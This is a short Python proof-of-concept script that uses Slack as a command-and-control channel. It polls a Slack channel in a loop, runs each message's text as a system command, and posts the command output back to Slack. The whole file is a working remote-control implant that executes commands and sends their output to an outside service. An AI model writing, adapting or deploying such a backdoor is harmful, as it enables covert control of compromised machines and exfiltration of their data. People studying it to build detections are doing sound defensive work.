import time
import json
import subprocess
from slackclient import SlackClient

'''
Very basic PoC of slack as c2. I will work on this more over the weekend.
'''


slack_token = ''
sc= SlackClient(slack_token)



print(sc.rtm_connect())


def send_data(data):
    sc.api_call("chat.postMessage",
             channel="G9VV55NAH",
             text=data
)

def pull_commands():
    while True:
        raw_commands = sc.rtm_read()
        if len(raw_commands) > 0:
            str_raw_commands = raw_commands[0]
            if len(str_raw_commands) > 3:
                j = json.loads(str(str_raw_commands).replace("'",'"'))
                data = subprocess.run([j['text']], stdout=subprocess.PIPE)
                send_data(data.stdout)
                #print('MESSAGE: ' + j['text'])
        time.sleep(.05)


pull_commands()
